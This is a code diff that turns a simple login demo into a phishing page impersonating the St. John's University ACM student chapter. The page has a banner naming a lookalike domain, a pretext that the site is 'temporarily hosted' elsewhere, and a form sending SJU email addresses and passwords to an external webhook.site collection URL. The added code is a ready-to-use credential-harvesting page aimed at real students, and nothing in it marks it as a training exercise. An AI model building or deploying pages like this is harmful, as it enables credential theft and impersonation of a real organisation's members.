@@ -1,67 +1,145 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page Demo</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: white;
-            padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            width: 300px;
-        }
-        h1 {
-            text-align: center;
-        }
-        label {
-            margin-bottom: 8px;
-            display: block;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>St. John's ACM Portal</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    header {
+      background-color: #d71920;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      background-color: #eeeeee;
+      padding: 10px;
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    nav a {
+      text-decoration: none;
+      color: #d71920;
+      font-weight: bold;
+    }
+    .banner-warning {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 12px;
+      text-align: center;
+      font-size: 0.95rem;
+      border-bottom: 1px solid #ffeeba;
+    }
+    .hero {
+      background: #ffffff;
+      padding: 50px 20px;
+      text-align: center;
+    }
+    .hero h1 {
+      font-size: 2.4rem;
+      margin-bottom: 10px;
+    }
+    .hero p {
+      color: #555;
+    }
+    .login-box {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+    }
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #d71920;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #b4151a;
+    }
+    footer {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #666;
+      padding: 20px;
+    }
+    .logo {
+      height: 60px;
+      margin-bottom: 10px;
+    }
+  </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Login</h1>
-        <form action="https://your-webhook-url-here.com" method="POST">
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" required><br>
 
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required><br>
+  <div class="banner-warning">
+    ⚠️ This version of the SJU ACM site is temporarily hosted at <strong>sjuacm-portal-support.com</strong>. Please sign in with your SJU email to continue.
+  </div>
 
-            <button type="submit">Login</button>
-        </form>
-    </div>
+  <header>
+    <img src="https://i.ibb.co/m84bK1P/pixelated-logo.png" alt="SJU ACM Logo" class="logo">
+    <h1>St. John's ACM</h1>
+    <p>Association for Computing Machinery - Student Chapter</p>
+  </header>
+
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Events</a>
+    <a href="#">Members</a>
+    <a href="#">Join</a>
+    <a href="#">Contact</a>
+  </nav>
+
+  <div class="hero">
+    <h1>Welcome to the SJU ACM Portal</h1>
+    <p>Access exclusive member resources and events. Please sign in below.</p>
+  </div>
+
+  <div class="login-box">
+    <h2>Sign in with SJU Email</h2>
+    <form action="https://webhook.site/your-fake-url-here" method="POST">
+      <label for="email">SJU Email</label>
+      <input type="text" id="email" name="email" placeholder="john.doe21@stjohns.edu" required />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required />
+
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+
+  <footer>
+    © 2025 SJU ACM. Hosted by ACM Unlimited Networks™<br />
+    <small>This portal is managed externally. Do not share credentials on unsecured networks.</small>
+  </footer>
+
 </body>
 </html>
+
